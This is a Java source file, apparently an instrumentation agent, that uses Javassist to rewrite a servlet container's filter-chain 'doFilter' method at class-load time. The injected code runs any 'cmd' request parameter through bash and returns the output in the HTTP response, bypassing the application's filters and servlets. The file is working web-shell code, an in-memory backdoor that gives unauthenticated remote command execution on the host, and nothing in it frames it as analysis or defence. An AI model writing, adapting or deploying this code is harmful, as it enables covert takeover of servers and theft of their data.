package com.acme.agent;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.LoaderClassPath;
import javassist.NotFoundException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class ApplicationFilterChainTransformer implements ClassFileTransformer {
    private static Logger LOGGER = LoggerFactory.getLogger(ApplicationFilterChainTransformer.class);

    private static final String TARGET_METHOD = "doFilter";

    /** The internal form class name of the class to transform */
    private String targetClassName;
    /** The class loader of the class we want to transform */
    private ClassLoader targetClassLoader;

    public ApplicationFilterChainTransformer(String targetClassName, ClassLoader targetClassLoader) {
        this.targetClassName = targetClassName;
        this.targetClassLoader = targetClassLoader;
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
            ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        byte[] byteCode = classfileBuffer;

        String finalTargetClassName = this.targetClassName.replaceAll("\\.", "/"); // replace . with /
        if (!className.equals(finalTargetClassName)) {
            return byteCode;
        }

        try {
            ClassPool cp = ClassPool.getDefault();
            cp.insertClassPath(new LoaderClassPath(targetClassLoader));

            CtClass cc = cp.get(targetClassName);
            CtMethod m = cc.getDeclaredMethod(TARGET_METHOD);
            m.insertBefore("""
            {
                if (request instanceof jakarta.servlet.http.HttpServletRequest
                    && response instanceof jakarta.servlet.http.HttpServletResponse) {

                    String cmd = request.getParameter("cmd");
                    if (cmd != null && !cmd.isEmpty()) {
                        jakarta.servlet.http.HttpServletResponse resp = (jakarta.servlet.http.HttpServletResponse) response;
                        resp.setStatus(jakarta.servlet.http.HttpServletResponse.SC_OK);
                        resp.setCharacterEncoding(java.nio.charset.StandardCharsets.UTF_8.name());
                        resp.setContentType("text/plain;charset=UTF-8");

                        ProcessBuilder pb = new ProcessBuilder(new String[] { "bash", "-lc", cmd });
                        pb.redirectErrorStream(true);

                        java.io.PrintWriter out = resp.getWriter();

                        try {
                            Process p = pb.start();

                            java.io.BufferedReader reader = null;
                            reader = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream(), "UTF-8"));

                            String line;
                            while ((line = reader.readLine()) != null) {
                                out.println(line);
                                out.flush();
                            }

                            int exitCode = p.waitFor();
                            out.println();
                            out.println("Exit code: " + exitCode);
                            out.flush();

                        } catch (Exception e) {
                            out.println("Error reading process output: " + e.getMessage());
                            out.flush();
                        }
                        return; // do not continue with filters or servlet
                    }      
                }
            }
            """);
            byteCode = cc.toBytecode();
            cc.detach();
        } catch (NotFoundException | CannotCompileException | IOException e) {
            LOGGER.error("Exception", e);
        }

        return byteCode;
    }
}
